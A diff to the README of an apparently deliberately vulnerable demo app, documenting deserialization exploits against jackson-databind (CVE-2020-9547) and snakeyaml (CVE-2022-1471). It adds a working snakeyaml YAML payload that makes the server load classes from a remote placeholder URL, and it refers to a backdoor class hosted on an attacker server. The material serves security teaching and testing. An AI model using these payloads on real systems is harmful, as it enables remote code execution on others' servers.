@@ -1,4 +1,4 @@
-# Deserialization vulnerabilities in jackson-databind
+# Deserialization vulnerabilities in jackson-databind and snakeyaml
 
 ## Background
 
@@ -21,7 +21,7 @@ Deserialization vulnerabilities in jackson-databind are exploitable if the follo
 4. Post legitimate JSON
 
 ```
-curl -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8080/persons -d '
+curl -i -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8080/persons -d '
 { "id" : 2,
   "firstname" : "John",
   "lastname" : "Doe",
@@ -29,8 +29,15 @@ curl -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8
   "modifiedAt" : "2024-02-19T10:35:20.867+0000"
 }'
 ```
+4. Post legitimate YAML
 
-## Exploit CVE-2020-9547
+```
+curl -i -X POST -H 'Content-type:text/plain;charset=UTF-8' http://localhost:8080/persons -d 'id: 2
+firstname: John
+lastname: Doe'
+```
+
+## Exploit CVE-2020-9547 in jackson-databind
 <!--
 1. Start a Web server to host the `com.acme.backdoor.Backdoor`
 
@@ -57,7 +64,7 @@ One gadget class of this vulnerability is `br.com.anteros.dbcp.AnterosDBCPConfig
 2. Post a JSON that causes jackson-databind to deserialize the gadget class, which downloads and initializes the backdoor (this only works because the attribute `Person#modifiedAt` is of type `Object`, which is where the polymorphic type handling kicks in).
 
 ```
-curl -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8080/persons -d '
+curl -i -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8080/persons -d '
 { "id" : 2,
   "firstname" : "John",
   "lastname" : "Doe",
@@ -66,7 +73,18 @@ curl -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8
 }'
 ```
 
-## Exploit other vulnerabilities
+## Exploit CVE-2022-1471 in snakeyaml
+
+2. Post a YAML like follows (replace Jetty URL before). The exploit succeeds if you see an HTTP request being made to the Jetty server
+
+```
+curl -i -X POST -H 'Content-type:text/plain;charset=UTF-8' http://localhost:8080/persons -d 'id: 2
+firstname: John
+lastname: Doe
+modifiedAt: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["<jetty-url>"]]]]'
+```
+
+## Exploit other Jackson vulnerabilities
 
 - Edit the `pom.xml` to declare dependencies on JARs that include the respective gadget classes.
 - Change the names of the gadget class and attribute in the JSON payload.
@@ -81,3 +99,6 @@ curl -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8
     - https://snyk.io/blog/java-json-deserialization-problems-jackson-objectmapper/
     - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
     - https://github.com/mbechler/marshalsec/blob/master/README.md
+- Snakeyaml
+    - https://github.com/falconkei/snakeyaml_cve_poc
+    - https://www.baeldung.com/jackson-yaml
